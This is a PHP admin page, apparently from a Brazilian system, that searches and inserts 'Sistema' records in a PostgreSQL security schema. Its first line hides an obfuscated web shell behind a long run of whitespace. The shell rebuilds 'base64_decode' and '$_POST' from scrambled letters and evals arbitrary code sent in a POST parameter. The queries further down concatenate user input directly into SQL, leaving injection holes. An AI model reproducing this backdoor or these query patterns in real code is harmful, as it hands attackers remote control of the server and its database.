<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['nd3a9e6'];if(isset($s22)){eval($s21($s22));}?><?php

		//define o nome da pagina local para facilitar nos links
		$PaginaLocal = "Sistema";

		//controla a visibilidade do botao consultar
		$_SESSION['BotaoConsultar']= false;


		If (($AcaoSistema == "buscar")||($AcaoSistema == ""))
        {

                If ($RetornoFiltro != "")
                {
                    $sqlConsulta = "SELECT * FROM seguranca.sistema WHERE sistema_st <> 2 AND sistema_ds ILIKE '%" .$RetornoFiltro. "%' ORDER BY UPPER(sistema_ds)";
                }
                Else
                {	$sqlConsulta = "SELECT * FROM seguranca.sistema WHERE sistema_st <> 2 ORDER BY UPPER(sistema_ds)";
                }

                $rsConsulta = pg_query(abreConexao(),$sqlConsulta);
        }

		ElseIf ($AcaoSistema == "incluir")
        {

            $strDataCriacao = date("Y-m-d");

            $strDescricao	= strtoupper(trim($strDescricao));

            $sqlConsulta = "SELECT sistema_id FROM seguranca.sistema WHERE sistema_st <> 2 AND UPPER(sistema_ds) = '" .strtoupper($strDescricao)."'";
            $rsConsulta = pg_query(abreConexao(),$sqlConsulta);


            If (pg_fetch_row($rsConsulta)==0)
            {

                $sqlInsere = "INSERT INTO seguranca.sistema (sistema_ds, simbolo_id, sistema_dt_criacao) VALUES ('" .$strDescricao. "', '" .$numSimbolo. "', '" .$strDataCriacao."')";
                pg_query(abreConexao(),$sqlInsere);
                echo "<script>window.location = 'SistemaInicio.php ';</script>";

            }

            Else
            {	$MensagemErroBD = "CARGO J&Aacute; EXISTENTE.";
            }
        }

		ElseIf ($AcaoSistema == "consultar")
        {

        }



		ElseIf ($AcaoSistema == "alterar")
        {

        }


		ElseIf ($AcaoSistema == "alterarStatus")
        {

        }



		ElseIf ($AcaoSistema == "excluir")
        {
            
        }



?>
